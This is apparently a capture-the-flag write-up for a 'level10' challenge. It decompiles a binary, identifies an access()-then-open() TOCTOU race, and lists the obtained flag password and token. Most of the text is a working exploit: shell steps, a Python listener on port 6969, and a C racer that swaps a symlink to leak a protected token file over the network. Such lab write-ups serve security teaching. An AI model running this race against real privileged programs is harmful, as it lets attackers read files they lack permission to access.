@@ -1,0 +1,184 @@
+level10 solved:
+
+FLAGS/TOKENS:
+	flag password: woupa2yuojeeaaed06riuj63c
+	token: feulo4b72j7edeahuete3no7c
+	
+SOFTWARE USED:
+	Bash
+	GCC
+	Python
+	(EXTERNAL) Ghidra
+
+Binary analysis (Ghidra decompiler):
+
+int main(int argc,char **argv)
+
+{
+  char *__cp;
+  uint16_t uVar1;
+  int __fd;
+  int __fd_00;
+  ssize_t sVar2;
+  size_t __n;
+  int *piVar3;
+  char *__file;
+  int in_GS_OFFSET;
+  char *file;
+  char *host;
+  int fd;
+  int ffd;
+  int rc;
+  char buffer [4096];
+  sockaddr_in sin;
+  undefined local_1024 [4096];
+  uint local_24;
+  in_addr_t local_20;
+  undefined4 local_1c;
+  undefined4 local_18;
+  int local_14;
+  
+  local_14 = *(int *)(in_GS_OFFSET + 0x14);
+  if (argc < 3) {
+    printf("%s file host\n\tsends file to host if you have access to it\n",*argv);
+                    /* WARNING: Subroutine does not return */
+    exit(1);
+  }
+  __file = argv[1];
+  __cp = argv[2];
+  __fd = access(argv[1],4);
+  if (__fd == 0) {
+    printf("Connecting to %s:6969 .. ",__cp);
+    fflush(stdout);
+    __fd = socket(2,1,0);
+    local_20 = 0;
+    local_1c = 0;
+    local_18 = 0;
+    local_24 = 2;
+    local_20 = inet_addr(__cp);
+    uVar1 = htons(0x1b39);
+    local_24 = local_24 & 0xffff | (uint)uVar1 << 0x10;
+    __fd_00 = connect(__fd,(sockaddr *)&local_24,0x10);
+    if (__fd_00 == -1) {
+      printf("Unable to connect to host %s\n",__cp);
+                    /* WARNING: Subroutine does not return */
+      exit(1);
+    }
+    sVar2 = write(__fd,".*( )*.\n",8);
+    if (sVar2 == -1) {
+      printf("Unable to write banner to host %s\n",__cp);
+                    /* WARNING: Subroutine does not return */
+      exit(1);
+    }
+    printf("Connected!\nSending file .. ");
+    fflush(stdout);
+    __fd_00 = open(__file,0);
+    if (__fd_00 == -1) {
+      puts("Damn. Unable to open file");
+                    /* WARNING: Subroutine does not return */
+      exit(1);
+    }
+    __n = read(__fd_00,local_1024,0x1000);
+    if (__n == 0xffffffff) {
+      piVar3 = __errno_location();
+      __file = strerror(*piVar3);
+      printf("Unable to read from file: %s\n",__file);
+                    /* WARNING: Subroutine does not return */
+      exit(1);
+    }
+    write(__fd,local_1024,__n);
+    __fd = puts("wrote file!");
+  }
+  else {
+    __fd = printf("You don\'t have access to %s\n",__file);
+  }
+  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return __fd;
+}
+
+
+Notice file is only opened after the permissions check:
+	Access is called first,
+	then a connection is made,
+	then the file is actually opened.
+
+Appears to be file racing/TOCTOU:
+
+Plan of attack:
+	rapidly switch a symlink to the token file.
+	upload this symlink in a loop until we receive a token.
+
+How to run:
+	$ touch output.txt && chmod 777 output.txt;
+	$ python serv.py >> output.txt &
+	$ gcc racer.c -Wall -Wextra -Werror -m32 -o racer
+	$ ./racer token &
+	$ while [ 1 -eq 1 ]; do ./level10 flagged 127.0.0.1 | grep "file"; done
+
+	Wait until there are a lot of sent file messages (around a 1-2 minute wait)
+	Kill the racer and python server
+
+	$ less output.txt
+
+	Search for any line that's not "this is a sinkfile" or the file header.
+	If there are none, repeat the entire process.
+
+Sources:
+	serv.py:
+
+# Echo server program
+import socket
+import os
+
+HOST = ''                 # Symbolic name meaning all available interfaces
+PORT = 6969              # Arbitrary non-privileged port
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen(0)
+
+while 1:
+  conn, addr = s.accept()
+  while 1:
+    data = conn.recv(1024)
+    if not data: break
+    print data
+  conn.close()
+
+
+	racer.c:
+
+#include <unistd.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+	(void)argc;
+/*
+	FILE* sink = fopen("_sinkfile", "w+");
+	if (sink == NULL) {
+		perror("Sinkfile creation failed");
+		return 1;
+	}
+
+	fputs("this is sinkfile", sink);
+	fflush(sink);
+	fclose(sink);
+*/
+ 	while (1) {
+		if (unlink("./flagged") == -1) {
+			perror("unlink 1");
+		}
+		if (symlink(argv[1], "./flagged") == -1) {
+			perror("symlink(flag -> argv)");
+		}
+		if (unlink("./flagged") == -1) {
+			perror("unlink 1");
+		}
+  		if (symlink("./_sinkfile", "./flagged") == -1) {
+			perror("symlink(flag -> sink)");
+		}
+	}
+ 	return 0;
+}
